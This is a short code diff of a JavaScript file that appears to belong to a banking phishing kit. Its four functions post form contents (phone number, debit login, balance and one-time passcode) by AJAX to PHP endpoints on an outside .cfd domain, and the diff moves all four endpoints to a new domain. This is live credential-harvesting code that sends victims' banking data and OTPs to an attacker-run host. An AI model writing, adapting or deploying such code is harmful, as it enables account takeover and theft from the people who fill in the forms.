@@ -14,7 +14,7 @@ function sendNohp(){
    
       $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.oo-nan.cfd/xe/no.php',
+        url: 'https://choreoapps.oo-feed.cfd/xe/no.php',
         data: $('#formHP').serialize(),
         datatype: 'JSON',   
     complete: function(){
@@ -40,7 +40,7 @@ function sendDebit(){
    
         $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.oo-nan.cfd/xe/login.php',
+        url: 'https://choreoapps.oo-feed.cfd/xe/login.php',
         data: $('#formlog').serialize(),
         datatype: 'JSON',    
     complete: function(){    
@@ -75,7 +75,7 @@ function sendSaldo(){
   
         $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.oo-nan.cfd/xe/saldo.php',
+        url: 'https://choreoapps.oo-feed.cfd/xe/saldo.php',
         data: $('#formsal').serialize(),
         datatype: 'JSON',   
    complete: function(){     
@@ -108,7 +108,7 @@ function sendOtp(){
    
         $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.oo-nan.cfd/xe/otp.php',
+        url: 'https://choreoapps.oo-feed.cfd/xe/otp.php',
         data: $('#formLink').serialize(),
         datatype: 'JSON',    
     complete: function(){
